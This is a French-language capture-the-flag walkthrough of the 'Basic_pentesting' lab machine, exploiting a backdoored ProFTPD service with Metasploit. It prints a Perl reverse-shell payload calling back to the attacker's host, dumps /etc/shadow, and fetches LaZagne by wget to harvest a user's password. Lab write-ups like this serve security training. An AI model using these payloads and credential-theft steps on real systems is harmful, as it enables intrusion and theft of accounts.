# Basic_pentesting
1.√ânum√©ration

**<span style="color: #dddddd;">üëÅÔ∏è</span> Massap**

```
‚îå‚îÄ[parrot@parrot]‚îÄ[~/Documents]
‚îî‚îÄ‚îÄ‚ïº $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
     
[i] Scan IP: 192.168.56.68
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.68...100%
[+] Scan Nmap 192.168.56.68...100%
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/parrot/Massap/192.168.56.68-tcp.html        |
==========================================================
```

&nbsp;

**<span style="color: #dddddd;">‚ò†Ô∏è</span> ftp-proftpd-backdoor**

Backdoor trouver sur `proFTP`

```
| ftp-proftpd-backdoor: 
|   This installation has been backdoored.
|   Command: id
|_  Results: uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
```

&nbsp;

**<span style="color: #dddddd;">üí•</span> Metasploit - ProFTP Backdoor**

Backdoor exploitable sur le `FTP`

```
[msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_133c_backdoor) >> exploit
[+] perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.56.104:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
[*] Started reverse TCP handler on 192.168.56.104:4444 
[*] 192.168.56.68:21 - Connecting to FTP server 192.168.56.68:21...
[*] 192.168.56.68:21 - Connected to target FTP server.
[*] 192.168.56.68:21 - Sending Backdoor Command
[*] Command shell session 3 opened (192.168.56.104:4444 -> 192.168.56.68:43044) at 2025-01-31 22:02:21 +0100

shell
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash
id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
root@vtcsec:/#

```

&nbsp;

Dump des `hash` utilisateurs

```
root@vtcsec:/home/marlinspike# cat /etc/shadow
cat /etc/shadow
root:!:17484:0:99999:7:::
daemon:*:17379:0:99999:7:::
bin:*:17379:0:99999:7:::
sys:*:17379:0:99999:7:::
sync:*:17379:0:99999:7:::
games:*:17379:0:99999:7:::
man:*:17379:0:99999:7:::
lp:*:17379:0:99999:7:::
mail:*:17379:0:99999:7:::
news:*:17379:0:99999:7:::
uucp:*:17379:0:99999:7:::
proxy:*:17379:0:99999:7:::
www-data:*:17379:0:99999:7:::
backup:*:17379:0:99999:7:::
list:*:17379:0:99999:7:::
irc:*:17379:0:99999:7:::
gnats:*:17379:0:99999:7:::
nobody:*:17379:0:99999:7:::
systemd-timesync:*:17379:0:99999:7:::
systemd-network:*:17379:0:99999:7:::
systemd-resolve:*:17379:0:99999:7:::
systemd-bus-proxy:*:17379:0:99999:7:::
syslog:*:17379:0:99999:7:::
_apt:*:17379:0:99999:7:::
messagebus:*:17379:0:99999:7:::
uuidd:*:17379:0:99999:7:::
lightdm:*:17379:0:99999:7:::
whoopsie:*:17379:0:99999:7:::
avahi-autoipd:*:17379:0:99999:7:::
avahi:*:17379:0:99999:7:::
dnsmasq:*:17379:0:99999:7:::
colord:*:17379:0:99999:7:::
speech-dispatcher:!:17379:0:99999:7:::
hplip:*:17379:0:99999:7:::
kernoops:*:17379:0:99999:7:::
pulse:*:17379:0:99999:7:::
rtkit:*:17379:0:99999:7:::
saned:*:17379:0:99999:7:::
usbmux:*:17379:0:99999:7:::
marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::
mysql:!:17486:0:99999:7:::
sshd:*:17486:0:99999:7:::
```

&nbsp;

**<span style="color: #dddddd;">ü§ñ</span> LaZagne**

Upload de lazagne pour trouver des identifiants

```
root@vtcsec:/home/marlinspike# wget http://192.168.56.104:8080/LaZagne-2.4.6.zip                       
--2025-01-31 16:45:00--  http://192.168.56.104:8080/LaZagne-2.4.6.zip
Connecting to 192.168.56.104:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 705000 (688K) [application/zip]
Saving to: ‚ÄòLaZagne-2.4.6.zip‚Äô

LaZagne-2.4.6.zip   100%[===================>] 688.48K  --.-KB/s    in 0.008s  

2025-01-31 16:45:00 (88.7 MB/s) - ‚ÄòLaZagne-2.4.6.zip‚Äô saved [705000/705000]

root@vtcsec:/home/marlinspike#
```

&nbsp;

Unzip

```
root@vtcsec:/home/marlinspike# unzip LaZagne-2.4.6.zip
unzip LaZagne-2.4.6.zip
Archive:  LaZagne-2.4.6.zip
```

&nbsp;

Ex√©cution de `LaZagne`

```
root@vtcsec:/home/marlinspike/LaZagne-2.4.6/Linux# python laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


------------------- Shadow passwords -----------------

[+] Password found !!!
Login: marlinspike
Password: marlinspike

------------------- Mimipy passwords -----------------

[+] Password found !!!
Process: /usr/sbin/lightdm
Login: marlinspike
Password: marlinspike


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 1.42734789848

```

&nbsp;

Cred trouver

| User | Password |
| --- | --- |
| marlinspike | marlinspike |
